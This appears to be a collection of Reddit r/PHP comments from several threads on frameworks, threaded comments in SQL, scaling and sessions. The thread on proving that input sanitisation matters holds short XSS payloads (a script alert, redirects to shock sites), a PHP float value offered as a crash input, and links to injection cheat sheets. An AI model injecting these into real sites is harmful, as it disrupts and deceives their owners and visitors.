this is my favorite, to the exclusive use of it. there are some other projects, like kohana &amp; fuel, that look promising too, once they are more developed. I would advise against cake, as I hated using it, found it too bloated, and very slow (which could have changed in the last few years), but to each his own. install xampp, and throw a few up, see which ones you find yourself wanting to code in.
I am currently using this on a website with millions of threaded comments and millions of monthly visitors on a few servers purchased in 2006. Maybe your experience has been different, but I spent a lot of time optimizing my code and my SQL/schema; the point is, this can effectively scale in certain situations.
Http://google.com?q=Site%3Areddit.com+%2Bphp+%2Bmvc There had been plenty of quality discussions on here many times before.
symfony
&gt; but I spent a lot of time optimizing my code and my SQL/schema The amount of time spent isn't germane; if you've ended up with adjacency lists or nested sets, you're still Doing It Wrong. Incidentally, the idea that you should need more than a $5 shared hosting account for millions of monthly views is laughable. If they're linearly distributed, you get 2.6 million pageviews a month out of one hit a second. Even if you assume a 0.3 zipf, you still get almost 1.6 million out of two hits a second. If you can't support 20 hits a second per server, you absolutely should not be involved in anything even beginning to resemble a discussion of scaling. &gt; Maybe your experience has been different Yeah, it has. I have one server running tens of millions of hits a month. &gt; the point is, this can effectively scale in certain situations. Scaling effectively means hundreds of millions of hits per month per server, not a few million hits per month spread across several servers. FTP sites were serving thousands of concurrent users in the early 1990s. You are not in a position to have this discussion, sir.
For those under 5.3.5 and 5.2.17 and happen to be sitting on the wrong server hardware: `2.2250738585072011e-308` **Edit:** after thinking about the consequences a bit and the OP's question, I'd actually recommend *not* doing this. I still stand by my opinion that known bugs in any platform must always be carefully managed even before a patch or update is installed. I still believe this is a lesson that every user of any platform should learn, as bugs are often an avenue for an attack. Short-term fixes can't be overlooked by long-term solutions. But not only might it turn people off to PHP even though the bug is already patched in current releases, it would also be a pain in the ass to deal with if you don't have at least command line access to kill the runaway process if the sever doesn't kill it for you.
A window.alert that says "if I was a crook, I'd just steal your cookie and take over your account instead of warning you like this."
Way to show that you completely failed to understand the question. Leveraging a math bug has nothing to do with data sanitation, and no, you shouldn't be "sanitizing" out legal floats to cope with bad version bugs.
No, he didn't say "how do I use this to steal shit."
No, this could potentially cause catastrophic damage. He wants to warn them, not to harm them.
He didn't ask how to use this to steal from people. He asked how to scare them into realizing the risk they were at.
[Amplicate](http://amplicate.com/software/188-top-frameworks/?months=6) shows that a lot of people love CodeIgniter and Symfony2 (note that this list includes other, non-PHP frameworks).
I love codeigniter. Though I will admit that I'm a one framework kind of guy.
I used a framework (codeigniter) as a way to force myself into the OO / MVC game. It seems to have worked pretty well.
A simple alert that simply states, "this website is insecure" and ignore everyone else in here telling you to break shit.
&lt;script&gt;alert("Insert evil stuff here");&lt;/script&gt;
Yii is supposedly the fastest. It's very easy to use as well.
You could use something like http://www.recessframework.org/, though that may be way overkill for what you want.
So tell me, how would you personally tackle a bug in a case where you don't have direct control over the software version installed, but have the means to temporarily prevent it from being exploited?
try various things from this site: http://ha.ckers.org/xss.html it's a bunch of cross site scripting examples you can use to see if something is vulnerable.
This is neither an adjacency list or nested set. The only place I use adjacency lists in this way is on the front end for UI functionality. At peak the site I mentioned gets well over 20 hits per second; you know nothing of my code, setup, traffic or caching strategy, so I'm not sure how you're qualified to tell me I'm Doing It Wrong. Comparing FTP daemon scaling to a httpd/web scripting/relational database setup is hardly comparable. I said that in certain situations, the method they use is scalable to a certain extent. This does not cost hundreds of thousands of dollars, or require a large time investment to support millions of users/hundreds of millions of pageviews monthly. 
Yuck, I remember this one: http://css-tricks.com/php-for-beginners-building-your-first-simple-cms/ I remember it because it was posted on Digg a long time ago and after it made the front page and people figured out it was full of security holes (SQL injection and XSS) they had a field day with it because he posted the code up as an example on his site, which he later took down for obvious reasons. Good times... Bad blogspam.
 window.location='http://www.lemonparty.org'; window.location='http://www.goatse.info'; window.location='http://www.tubgirl.ca'; Any of those should work just fine.
&gt;l I don't want to rewrite the fucking thing every time someone upstairs &gt; gets a hair up their ass and wants a new field or some shit. ...and thats how Banner started too. Nasty SQL that thing has. 
The script could also display an alert saying "This is a scary message. You are at risk." It could be anything you want it to be. Dumbass.
Not sure OP's situation, but a simple alert only shows that injecting JS into the page is possible. Depending on the people he has to "prove" it to, that may not be enough to get his point across. They could think of it as a "Okay, cool you can make windows popup with text, how does that really hurt anything?" Considering the OP needs to prove that data sanitation is important in the first place, I'm not sure we want to make too many assumptions about how smart they are.
Have you considered trying this out yourself by downloading reddit's source and updating accordingly? I don't ask because I feel you "should have" or anything... I just ask out of curiosity, and wonder if you know that the source is available as a VM, etc...
I saw the tables once, had nightmares for a week. I really don't want to touch it if I don't have too. Luckily I don't work in IT so I don't have to bother with Banner I just need to tell them what data we need.
I tried the recess framework about 2 or 3 months ago and had problems getting it set up. It sounds like a good idea in theory but there's a level of 'it does too much for me' that I don't want to cross and I think this one is right on that boarder.
Fair enough. I read the orignal scenario as this. The OP is visiting a page with session_start and dumping the $_SESSION variable. He is then making an Ajax call and looking at the $_SESSION variable dumped on the secondary call. He says that the ids are the same (correct), but the data is different. This is because his Ajax call is changing session data and he expects the initial page to have the updated $_SESSION info without reloading the page? Maybe I am wrong, but the way that I am interpreting the original question is that the OP is confused with the way sessions work in general.
Server side code...
After reading your latest response, and then re-reading the original post, I completely see where you are coming from and withdraw my earlier snide comment. It's not clear to me what the original poster is actually asking because his language is imprecise. Perhaps if he had supplied some code and output samples like people used to do in the good old days.
For one thing, you'd learn an important lesson about hosting. Either manage things yourself or choose a vendor who manages them well.
Yes, he is confusing, but it doesn't help that my initial answer was jumbled too. I upvoted your comment anyway because I respect anyone that calls me to the mat. ;)
Then there's XSScripting. Usually a &lt;script&gt; tag is injected. If your "people" really print unsanitized data, then they deserve it. But please, do not do any harm. The SQL injection example from above doesn't do any harm - it only produces downtime.
http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/
Edit: I meant server side PHP code that will execute. 
No SQL, no XSS... What else do we have left, that doesn't involve an `eval()` which he probably doesn't even use?
A GET or POST var is just a string of data. It doesn't execute anything magically.
Unless he is using `eval()`, you won't be able to run server side code via `$_GET` or `$_POST`. It will just be a string of data. Without `eval()`, the only way to run arbitrary server-side code is via an unsanitized file upload / serve script. However, if the data is being passed as parameter or code to another environment (HTML/XSS, SQL/Injection, CLI/Injection), you can make the existing code behave in a way which is undesirable. Since you don't seem to have a grasp of common attack vectors, I recommend you [take a look at the following presentation I've created for university students](http://dl.dropbox.com/u/17565655/misc/php_security_demo.zip) for a one class introduction to PHP. Included are two badly protected scripts which are used to demonstrate a common XSS attack and a common SQL Injection attack. 
http://xkcd.com/327/
 "parent_object_id" for the parent id "parent_object_type" for the parent object type "parent_comment_id" for the parent comment id "child_comment_count" for the number of child comments on the comment load the first 200 comments (or whatever amount) based upon the "parent_object_id" and "parent_object_type". Do a loop "childrenising" each comment by "parent_comment_id". If the child has child comments, given by "child_comment_count" but not actual loaded children then present a "load more comments" button (like reddit) otherwise print out the nested comments.
Since you cannot bind an array your best bet is to loop through them before building the query with something like foreach($array as $val) { $placeHolder[] = '?'; $bindingValues[] = $val; } $placeHolder = implode(',', $placeHolder); $sql = "SELECT FROM foo WHERE bar IN($placeHolder)"; $stmt = $db-&gt;prepare($sql); $stmt-&gt;execute($bindingValues); 
sorry for the orangered, bookmarking your comment
I don't think it's guaranteed the row ids are going to be within 0-(number of rows in the table). Try getting the count of rows in the database, pick a random number between 0 and one less than the count of rows, and then select only that row using "SELECT image FROM names LIMIT X,1", where X is the random number you picked).
Take a look at the answer I already gave. I'd pop up a scary window alert, which pointed out that if I were a jerk, I'd be stealing their account data instead of warning them. In fact, that's exactly how I've done it, on several occasions.
I did something similar years ago, and the idea is to use recursion: (Pseudocode) define display_comment(comment) { if SQL-QUERY("select COMMENT-ID from comments where children=$comment;")) display(COMMENT-ID) else echo $the-whole-comment }
PHP wouldn't execute GET or POST data automagically. I'm actually kind of curious now what you think data sanitation is? If you're probably escaping output, using SQL parameters, etc, then there is nothing to worry about it. Perhaps you're trying to prove a point that doesn't need to be proven.
&gt; At peak the site I mentioned gets well over 20 hits per second Gasp! 20 hits per second! (rolls eyes) And you need several servers to pull that off. Oy vey. ConTiki running on a c64 can serve faster than that. Unless every time you serve a page you're generating War and Peace algorithmically, that is performance to be humiliated by. That's just pathetic. &gt; you know nothing of my code, setup, traffic Yeah, that's why I gave predictive constants, is that you didn't bother to even mention the scale of the thing you were using to brag. And what a surprise, it turns out to be unimpressive. &gt; Comparing FTP daemon scaling to a httpd/web scripting/relational database setup is hardly comparable. When you're talking about servers from 20 years ago, it's still instructive, especially when dealing with contention locks. FTP servers dealt with a hell of a lot more bandwidth per user, provide a lot more timing collision problems, etc. It's actually a substantially harder problem, which if you were the guru you act like you are, you'd know. &gt; you know nothing of my code, setup, traffic or caching strategy, so I'm not sure how you're qualified to tell me I'm Doing It Wrong. That you haven't bothered to justify your background does not affect my qualifications in any way, sir. My qualifications are I gave the correct numbers in the correct form. You don't even appear to recognize them. But you go on and brag about how you need several servers to handle 20 requests a second, which is substantially lower than the sarcastic line I already set. &gt; I said that in certain situations, the method they use is scalable to a certain extent. Repeating yourself doesn't make you less wrong. &gt; This does not cost hundreds of thousands of dollars Yes, actually, it does. We're talking about Reddit, which frequently states that its major problem is IO contention. A closure tree would massively reduce said contention, by reducing the number of queries, the number of ranges, the calculated work, the total throughput and so forth. This would drop their hosting needs dramatically. Without testing it's unclear how much; the raw volume of data drops probably 10% or more right off the bat, which is going to be tens of thousands of dollars a year at their scale. Since they're still on rotational media, you also have to deal with fragmentation and locality; this will reduce their seek time 20% or so. With aggregate read that's around a 10% speed increase, which is another several tens of thousands of dollars. On top of that, since less data is on disk, global fragmentation will be less, though estimating the amount would be irresponsible, since it'd require a hell of a lot of data I don't have. Past that, you get a single scan over a single index to read out any subtree. That's true of edge painting, though not adjacency lists, parent pointers, or probably to whatever random thing you vaguely allude to believing is going on, though you sure haven't put any effort into explaining what that thing you believe actually is. That's going to reduce the read workload by more than 20%, assuming fragments are over 1.5g on average. On top of *that*, they're also going to get radically better performance out of the query optimizer, since the resulting query is so much simpler and on what databases are built to do efficiently ("fit this range.") In MySQL InnoDB you can expect about a 25% faster general execution on this than the thing in the manual, given a large-ish dataset which is identical between the two tested implementations. This stuff adds up. &gt; I said that in certain situations, the method they use is scalable to a certain extent. You're just writing "certain" in places to make it look like you said something more specific than you actually said, so that you can pretend that any dissenting opinion is some kind of generalization. You don't know what you're talking about. 
&gt; The script could also display an alert saying "This is a scary message. You are at risk." Yes, that's what I already said, before you replied. But that isn't the example that I responded to.
&gt; but a simple alert only shows that injecting JS into the page is possible Yes, that's what I already said, before you replied. I also gave a message that would preclude "how does that hurt anything."
&gt; Have you considered trying this out yourself by downloading reddit's source and updating accordingly? Dude, why do you assume I would point people to a tree mechanism that I've never used, with clear statements of its superiority? I've been using closure trees for more than ten years, since I learned them from Celko. You just can't http://book. Yes, I considered donating decent architecture to Reddit. I've actually been working on that in my spare time. However they have much, much bigger problems than their tree storage.
No problem :)
Thanks.
I'd be interested to hear some of their other problems. I don't doubt you, but I'm interested in your take on it. Fantastic slideshow, btw.
Anything that causes downtime is doing harm.
I recently took over a site that was made by a team of Indians. There was no data sanitation. Hackers were able to append data to the scripts. I have also seen hackers compromise a site with an unsanitized contact form. I would really like to know how they did this.
&gt; Dude, why do you assume I would point people to a tree mechanism that I've never used, with clear statements of its superiority? I didn't assume that at all. I said nothing about whether or not I believed you had used them. I was just curious if you'd considered contributing to the reddit source, since the reddit admins seem otherwise tied up on various tasks. That being said: the presentation you linked, while interesting, said nothing about the "efficiency" of closure trees. Only that they made a lot of tasks much easier. I'm not saying they're not more efficient, and I frankly have done no additional reading on them... I'm just saying that what you liked didn't seem to back up your assertion...
I think you are very confused when it comes to security. Common exploits and how to fix them are VERY WIDELY KNOWN public information every web developer should be screaming from the rooftops to their less informed peers. Where does it say a single thing about stealing from people? Obviously any site with important information is not vulnerable to this, because they would have been hacked already. This is educational stuff found on Wikipedia... soo yeah.
I am not, but this is interesting stuff. Thanks for the link. :)
&gt; and then select only that row using "SELECT image FROM names LIMIT X,1" Except that limit isn't SQL, it's a vendor-specific extension. But yes, one needs to cope with gaps, and no, it isn't very hard.
&gt; I think you are very confused when it comes to security. That's nice. You have no reason to think that. I haven't said anything incorrect about security. &gt; Common exploits and how to fix them are VERY WIDELY KNOWN public information So? &gt; Where does it say a single thing about stealing from people? The part where instead of popping up a warning window you suggest redirecting to something at a different site called evil script? Maybe you didn't read the article, and thought he was asking how this worked. Try reading the article before responding. &gt; Obviously any site with important information is not vulnerable to this Yeah, this never happens in the real world at any important site. (cough) And I'm the one who's confused about security.
I checked that out (and much of the other sections as well) and do like it. But I'm looking for perhaps a more verbose article on it. I Googled "closure trees", oh damn. NM, just realized it's "closure *table*", that provided many more results. Thanks for that solution, I've looked into it a number of times but never ran across that method. Nested sets was all I could find that was better than adjacency lists. EDIT: [This dude](http://karwin.blogspot.com/2010/03/rendering-trees-with-closure-tables.html) wrote the sql-antipatterns-strike-back. And he [wrote a book](http://www.pragprog.com/titles/bksqla/sql-antipatterns) based on it.
&gt; &gt; &gt; Have you considered trying this out yourself &gt; &gt; why do you assume I would point people to a tree mechanism that I've never used &gt; I didn't assume that at all. Sure reads that way to me. &gt; That being said: the presentation you linked, while interesting, said nothing about the "efficiency" of closure trees. It shouldn't have to. It pointed out the efficiency problems in the others. If you understand SQL, you know how to draw the same conclusions about the closure tree. Seriously, this is 101 stuff. If you can't figure out the complexity of a closure tree, then you're not ready for production SQL. &gt; Only that they made a lot of tasks much easier. This isn't what it says at all. This is, in fact, wrong. Closure trees are rather more a pain in the ass than the naive methods. &gt; I'm just saying that what you liked didn't seem to back up your assertion... It backs it up just fine. This is like claiming that a paper on A* doesn't prove its efficiency because it doesn't discuss order of growth on arrays. If you don't know the complexity of a simple SQL index scan, then this paper is aimed above your head. Stop interpreting things you don't understand as missing things, and stop telling people that they haven't backed themselves up just because you don't understand the material placed in front of you. It's *one* integer index scan. Seriously, there is literally nothing in SQL more basic. *Nothing*.
I don't suggest redirecting to anything. I just suggested to load an external script on the page. He can do whatever he wants in the script, let him be creative man, it's his evil script, so now we're playing by his evil rules. What major site has been compromised like this lately? This is straight up newbie stuff. Obviously the guy needs to learn about XSS, a suggestion that's more beneficial than just telling him an answer, and probably more beneficial than your entire post history combined.
Either the target was using `eval()` with unsanitized data ([yes, you can use `eval()` safely **when the data is properly sanitized**](http://stackoverflow.com/questions/1279081/getting-static-property-from-a-class-with-dynamic-class-name-in-php/1279124#1279124)) or didn't check the content of uploaded files via forms and simply blindly copied into a directory (or uses `include()` or `require()` instead of `readfile()`). Since you don't seem to have a grasp of common attack vectors, I recommend you [take a look at the following presentation I've created for university students](http://dl.dropbox.com/u/17565655/misc/php_security_demo.zip) for a one class introduction to PHP. Included are two badly protected scripts which are used to demonstrate a common XSS attack and a common SQL Injection attack. Code doesn't just execute itself.
You'd be looking at a class called UserController with functions: addAction(), editAction(), etc . The controller actions talk to the database (model), then gives information to the view (html). An example would be an array of users. The controller is always the first thing in MVC to do stuff, which is why it's called the controller.
They're IO contending because they buy swarms of small servers instead of big servers (much cheaper) that have enough ram to hold the hot dataset. The hot dataset doesn't scale with the userbase. They're IO contending because they use terrible SQL and terrible index planning, no partitioning, no sharding, etc. They're IO contending because they're buying rotational media, as if the best way to run an IO contending site is to buy the slowest storage on the mass market. They're IO contending because they're not caching result sets anywhere near often enough. They're IO contending because they aren't relying on client caching or hot fragment updates *at* *all*. They're IO contending because they're rolling their own hot/cold system instead of relying on the extremely mature, extremely well planned ones in SQL backends. They're IO contending because instead of running this out of a simple in-place threaded C++ app, it's a bunch of different languages, processes, daemons, packet exchange, transmission, boxing, unboxing, packing, unpacking, serialization, querying, reading, writing, etc. They're IO contending because they have datastructure tactics that would embarrass a college sophomore. This is the peak of cowboy seat-of-the-pants design. Hundreds of thousands of dollars of servers a year to cope with less traffic than AOL in 2000 and several hours of spotty uptime every single day at predictable timings. Most of reddit could be served out of a flat cache and nobody would ever notice. I'd be willing to bet that the vast bulk of Reddit's actual traffic is sending the same god damned thread over and over to small groups of people in arguments. There's no reason for 90+% of Reddit's traffic to exist in the first place, except that nobody's willing to knuckle down for a week and write an incremental client-side javascript updater. Any competant architect could lower their workload by two orders of magnitude in three months plus whatever amount of time it takes to rip out the mess that's in place.
Ok, so you know it's the same sessionId, which means the same session variables are available. It seems like you're not aware that you always have to call session_start() in order to get access to the session, but it's hard to tell.
&gt; Obviously the guy needs to learn about XSS Go away until you've at least read the article, please. &gt; and probably more beneficial than your entire post history combined. Whatever you have to tell yourself to feel powerful, kid. [Here's just one counterexample from a couple days ago](http://www.reddit.com/r/PHP/comments/f2yb3/query_help_2_joins_group_and_an_order/c1cvyjd). I don't see anyone thanking you.
Umm... there is no article on this submission.... and I'm 11 years old IRL so I guess I'll call you dad. (Was that you visiting mommy on Christmas?)
http://www.radiumvinteractive.com/php-tutorial-backstory-and-setting-up-php/
Seriously... there is a domain for this... [**`example.com`**](http://example.com). Please use it.
I'm promoting evil.com with some SEO link juice.
&gt; stop telling people that they haven't backed themselves up again you don't get it. I made a serious point of saying that the presentation you linked didn't seem to back up the assertion and not that I felt the assertion was wrong, or that I didn't believe you had good reason to feel closure trees were faster. You should probably learn to stop taking everything so personally. I can't fathom being a coworker of yours. For the record: This is /r/PHP, not /r/sql or /r/databases - an expectation of SQL knowledge isn't a reasonable expectation of someone in here. That being said, I have the SQL knowledge to understand that presentation. I'm just saying that the presentation made no argument for the *efficiency* (in terms of CPU cycles) of a closure tree. It was positioned more along the lines of superiority for organizational reasons. &gt; This isn't what it says at all. This is, in fact, wrong. Closure trees are rather more a pain in the ass than the naive methods. Sure, more of a pain to implement, but not to "use" in terms of performing certain operations on a tree: **Right from the presentation**: - Easy to insert a new child of comment #5 - Easy to delete a child of comment #7 - Easy to delete the subtree under comment #4 And then in the summary/chart it provides, the feature comparison covers the following items: - design type (i.e. closure tree, adjacency list, etc) - number of tables (easy/hard) - query child (easy/hard) - query subtree (easy/hard) - modify tree (easy/hard) - referential integrity (yes/no) The presentation *isn't even hinting at you* to deduce efficiencies gained in terms of CPU. If you spend some time analyzing it deeper, sure, maybe that becomes apparent - but the presentation is strictly talking about certain operations on trees that this structure makes easier. TL;DR - you're so busy taking shit as a personal attack when it's not even close to meant that way that you kind of come off as a douche who just has to be right about everything.
Yea, and costing **them** money in the process... I own I domain which is widely (but wrongly) used in examples... It's annoying. Useless traffic which brings me no money and just reduces the amount of pages I'm able to serve. **Example.com** exists for that reason.
I'm fighting a guerilla war against them through reddit. Don't tell anyone. (It's a super secret.) http://secret-plans.com/the-super-secret-guerilla-war
Email header injection is another one. Command line injection too (which can append PHP to PHP scripts). Pretty much any time to send a string to an external system, you are taking a risk which depends on that external system.
Sounds like you may want something like symfony's admin generator http://www.symfony-project.org/book/1_2/14-Generators
You have control over the software. Maybe not directly, but indirectly you do. Unless you are using one of those free shared hosting sites, in which case the correct choice to to take your service elsewhere and be willing to pay cash money in exchange for a service that gives a crap. But within an enterprise, you DO have influence and should use it to keep the company's systems secure.
Fuck everyone downvoting you.
foreach($array as &amp;$val) { $val = (int)$val; } $placeHolder = implode(',', $array); $sql = "SELECT FROM foo WHERE bar IN($placeHolder)"; $stmt = $db-&gt;prepare($sql); $stmt-&gt;execute();
&gt; I made a serious point of saying that the presentation you linked didn't seem to back up the assertion. Yes, you did. And that serious point is *wrong*. &gt; You should probably learn to stop taking everything so personally. I'm not taking anything personally. Stop inventing emotions to look down on. &gt; you're so busy taking shit as a personal attack Uh huh. G'bye, guy.
Yeah, Bill's good people. There are dozens of other ways to do trees in SQL. Someone thought I was bluffing saying that once; [I made a partial list](http://www.reddit.com/r/PHP/comments/eh9k0/doctrine_one_to_many_relationship_problem/c18d3sa). There are lots of others too.
nice try, wannabe hacker
&gt; Leveraging a math bug has nothing to do with data sanitation &gt; I'd pop up a scary window alert Right, so what I gather your take is that all system and application bugs are somebody else's problem, and that preventing exploits is of no concern to the platform user.
kohana 3
You're ... absolutely wrong about my take. In a way that is completely incomprehensible to me. Please don't attempt to speak for me.
I'm not sure what I've done to merit so much attention from you, I was simply sharing my experience. I'm not here to brag about my website or to try and back up my arguments with traffic statistics. I said "well over 20 hits per second"; the site gets more traffic than many. I understand your opinion is that I am a terrible programmer who has no clue what I'm talking about... My point still stands, I am using a method similar to adjacency lists on a single webserver/database server setup to serve hundreds of millions of page views with nested comment trees like this **without issue**. This is done because (as mentioned before) I use an external index to filter, and do not need to order by anything other than primary keys. There are no joins or extraneous table scans involved. You can continue quoting statistics from C10K or SQL Antipatterns and tell me how people were squeezing performance out of servers a decade ago, but it won't change the fact that this will work for the majority of people who are using it in the way I am, with minimal investment. Closure trees are not the catch-all solution for storing hierarchical data in a relational database. If you don't need to query subtrees, adjacency lists can be just as fast, if not faster than closure tables. I tested this before I chose to go in the direction I did with a dataset of a few million items. If I had chosen closure tables I would be doing twice the number of queries and joins; the only benefit I saw was taking advantage of cascading deletes. I did not say it would be a good idea for Reddit to implement this, it would perform terribly on Reddit (plus they aren't even using a relational database). If I were looking to replicate all the functionality of Reddit's commenting system, I **would** most likely go with closure tables. I am not familiar with how Reddit does their commenting, nor claim to be.
I know this. Which is why I'm confused as to how the hackers were able to append code that added a 1px x 1px iFrame to the end of the script. Even if the permissions were screwed up - this shouldn't be able to happen. The POST and GET variables were unsantized. I'm 99% sure nothing was sent to an eval() function.
&gt; I'm not sure what I've done to merit so much attention from you You replied to me, and said something I found frustrating. &gt; the site gets more traffic than many Why do you keep talking about your site traffic? You brought it up to prove you had the chops to talk about scaling. Except, well, your site doesn't scale. &gt; My point still stands Saying this does not make it so. &gt; I am using a method similar to adjacency lists on a single webserver/database server setup to serve hundreds of millions of page views with nested comment trees like this without issue Yeah. And you need several servers to serve 20 pages a second. That's called a failure to scale adequately. Repeating yourself doesn't change that. &gt; You can continue quoting statistics from C10K or SQL Antipatterns I haven't quoted statistics from either of those sources. I haven't quoted statistics at all. I also haven't quoted C10k at all, and the thing I did cite - *not* *quote* - was a slideshow on slideshare, not the book SQL Antipatterns. That slideshow doesn't have any statistics in it. &gt; it won't change the fact that this will work for the majority of people who are using it in the way I am And that has nothing to do with whether it scales, because *you* *don't* *scale*. This is like saying beef can scale to feed the world, then pointing out that it feeds Omaha. Why are you repeating yourself? We get it. You have a very small site running on way too much hardware, and you think that means that the method you use is appropriate for scaling. Ho, hum. &gt; with minimal investment. No, dear. Using several servers for something that should fit in a $5/mo shared hosting account isn't "minimal investment." &gt; Closure trees are not the catch-all solution for storing hierarchical data in a relational database. Nobody said they were. &gt; If you don't need to query subtrees, adjacency lists can be just as fast No, they cannot be. Please stop making things up about topics you know nothing about. You might as well say that bubble sort can be as fast as quicksort. All you're doing is holding a red clueless flag over your head and screaming for attention. &gt; I tested this before I chose to go in the direction Liar. &gt; If I had chosen closure tables I would be doing twice the number of queries and joins Lol. You do one query for any operation on a closure table except move, and there is *never* a join under any circumstances. You're lying through your teeth. &gt; the only benefit I saw was taking advantage of cascading deletes. There's no cascade in a closure table either. You are lying through your teeth. &gt; (plus they aren't even using a relational database) Reddit is running out of Postgres, and of course, closure tables run just fine in NoSQL. Which you'd know, if you even began to understand how they work. Which you obviously do not. :) &gt; If I were looking to replicate all the functionality of Reddit's commenting system, I would most likely go with closure tables. But nobody cares what you'd go with, because you're talking about technology you _painfully_ obviously do not undersatnd.
I recently took over a site that was made by a team of Indians. There was no data sanitation. Hackers were able to append data to the scripts. I have also seen hackers compromise a site with an unsanitized contact form. I would really like to know how they did this. The hackers were able to append code that added a 1px x 1px iFrame to the end of the script - just through an unsantized login script. Even if the permissions were screwed up - this shouldn't be able to happen. The POST and GET variables were unsantized. I'm 99% sure nothing was sent to an eval() function.
By never, ever using in. It's a complexity nightmare. Yes, I realize you're trying to ask about varargs; I'm just going to ignore that, because it's a simple string implosion. There are legitimate reasons for in to exist; if you can't argue for why you're using it over the alternatives, you shouldn't be using it. The correct approach is using union all to build a temporary table, then joining against that.
I use something similar to this: function placeholders($number) { if (is_array($number)) { $number = sizeof($number); } return substr(str_repeat('?,', $number), 0, -1); } Then you just pass your bind to it or a number and it creates the placeholders. $data = array(1, 2, 3, 4); $sth = $db-&gt;prepare('SELECT FROM foo WHERE bar IN(' . placeholders($data) . ')'); $sth-&gt;execute($data);
Exactly. But, my point was (other than responding in kind to a rather rude reply from StoneCypher) is that while waiting for a patch to be installed by whoever owns the system, or while waiting for the transfer to a new host, it may be best to deal with that bug with a temporary patch or workaround of your own if you have the means. Not accounting for known bugs IMHO is just as bad as blindly processing user input, which was why my example where `(int) "2.2250738585072011e-308"` is sometimes a bad idea.
You continue to write authoritatively on how my setup does not scale, despite the fact that it does; other sites the same size have a much higher cost of operation and number of servers, I use a few running at minimal capacity. Scaling is a relative term; the traffic to my site could increase 500% and still not be near capacity, I'd call that decent scaling. [Reddit uses **hundreds** of EC2 instances](http://www.reddit.com/r/IAmA/comments/a2zte/i_run_reddits_servers_and_do_a_bunch_of_other/) and you're griefing me for using three? I think you misunderstand my discussion of closure tables. There is a closure table as well as an item table. There has to be multiple queries per operation, as well as joins. This is what I was mentioned cascades for. A select on an items table with an order on an index can definitely be faster than a select on an items table joined to a closure table followed by a sort in code or on the database. You're clearly knowledgeable and experienced in dealing with this particular issue, but you keep accusing me of lying through my teeth about my performance and testing; why would I bother doing such a thing unless I was just trolling you? 
*Showing* idiots is not as important as how you *describe* it. Tell them you could steal their entire database, store kiddy porn on the server, attack the US Government from their server, etc. And for fuck's sake, be anonymous about it.
&gt; The correct approach is using union all to build a temporary table, then joining against that. Realistically, the DB's optimizer should be able to do that even with the IN if it decides it's worth it. 
put some javascript in there if it's a variable thats going to be displayed on the webpage. (perhaps this might be the only legitimate use of the alert() function)
Realistically, what a db's optimizer should be able to do is often not the same as what it actually can do, because the DB can't prove they mean the same thing.
&gt; You continue to write authoritatively on how my setup does not scale, despite the fact that it does 20 hits per second needs multiple servers. That Ain't Scaling. For reference, a typical Apache MPM box can serve around 4500 concurrent customers with about a two and a half second return route time. That's a hundred and fifty times the load your server *group* is facing, per-box, and that's with no attention of any form to the specifics of the problem. YAWS can often hit triple that. You can repeat numbers until you're blue in the face; you don't have enough experience to understand how bad the numbers you're looking at actually are. You should be asking for help, not bragging. &gt; Reddit uses hundreds of EC2 instances and you're griefing me for using three? 1) Reddit doesn't scale either. 2) Reddit has a lot more than 20 hits per second per server, let alone 20 hits per second per server group. 3) PlentyOfFish serves 20 times Reddit's traffic with an average page complexity an order of magnitude higher from two servers. 4) If reddit's your meterstick, it's no wonder you're proud. All you have to do is not go down and you feel like Hercules around these parts. &gt; the traffic to my site could increase 500% and still not be near capacity, I'd call that decent scaling I'd call that ridiculous under-utilization and over-provisioning. Scaling doesn't mean "I buy more servers than I need." &gt; You're clearly knowledgeable and experienced in dealing with this particular issue That makes one of us. &gt; but you keep accusing me of lying through my teeth about my performance and testing; why would I bother doing such a thing unless I was just trolling you? Because you wanted to not look retarded in public, and thought digging yourself deeper would do the job? Because you really believe the stupid things you're saying? The hell do I care why? You're doing it, regardless what the motivation is.
There are quite a few code injection paths. Eval is one, so is `preg_replace()` with the `/e` modifier. Also check for the use of backticks, etc, etc. Maybe one of the old admins had a keylogger installed on his/her system. Maybe there's an obscure backdoor. Really there's too many possibilities, especially not knowing the inner workings of your site and server. Hate to say it, but figuratively speaking, it may be time to reformat your harddrive and start from scratch.
I don't see how using IN would ever differ from joining against a tempt able, and I would suspect any decent optimizer to make that determination quite easily, cache the plan, and generally not do stupid shit. Unless it's Oracle, in which case all bets are off.
No that is not the correct approach. The correct approach is using IN. Build a temp table just to avoid using IN ? Why in the world would you do that? If that's your coding style then I bet your code frequently suffers severely from second system syndrome.
[CGI::Session::Auth](http://search.cpan.org/~geewiz/CGI-Session-Auth-1.07/) says very expressly: &gt; **IMPORTANT:** The class CGI::Session::Auth itself is only an abstract base class with no real storage backend (only the user 'guest' with password 'guest' may log in). You have to derive a child class that implements its own _login() method where the actual authentication takes place. You will need to look at your current code to determine where and how session data is being saved to disk (or in the database), and then simply repeat the same process in your PHP code.
Instead of the substr, you can also: return join(', ', array_fill(0, $number, '?'));
I recently implemented nested comments using Redis. The way I did it was, each comment level was implemented using a List, and the list key had a reference to the parent comment ID (root is ID 0). For example: post:1:comments:0 &lt;- the top level comments for post ID 1 post:1:comments:2 &lt;- list of comments that are replies to comment ID 2 etc... So then, you can very easily recursively build the comment tree. With the framework I'm using, it's even simpler because it's an MVC framework so I can simply have the comment view recursively call itself as well. The end result for my project looks like this: http://twitpic.com/3swbq5 I was considering doing a blog writeup on this soon... maybe I will do it after all.
Maybe one of these would do... I haven't used either. https://github.com/jimeh/php-rack https://github.com/creationix/rack-php 
Thank you for pointing that out. I found the temp files and I was unable to cat them (they are binary), but the strings command returns very interresting informations.
Yii is really well written and the core dev team is very active and they respond to forum posts frequently. the community is great, the release schedule is pretty frequent, and the new features are starting to get pretty cool. It can be a little daunting to start Yii (or any framework) without a solid fundamental understanding of php, object oriented programming, and the general idea of MVC, but if you have those, I would give yii a shot.
Thanks, but my issue with those is bouncing from one language to another.. I guess what I'm looking for would be best called a "PHP Servlet".
They're probably [Storable](http://search.cpan.org/~ams/Storable-2.25/) files, which you won't be able to read using PHP. You're likely going to be well-served by modifying your Perl code to store the session data in a database, where PHP can get to it without a problem.
Considering how upset you are you should probably get a different domain. Might I recommend: nobodyhotlinktomysite.com
I won't recommend CakePHP since its a slow and legacy framework. If you are really wanna use a framework, check for frameworks like Kohana, Lithium or Symfony, that follow strict OOP. I prefer Kohana3 
Oh? Which domain? :) :) :)
Typically, I quote the values using PDO-&gt;quote() — it's not perfect, but it's better than doing some crazy SQL generation gymnastics IMO.
Oh, you're the troll. I get it now.
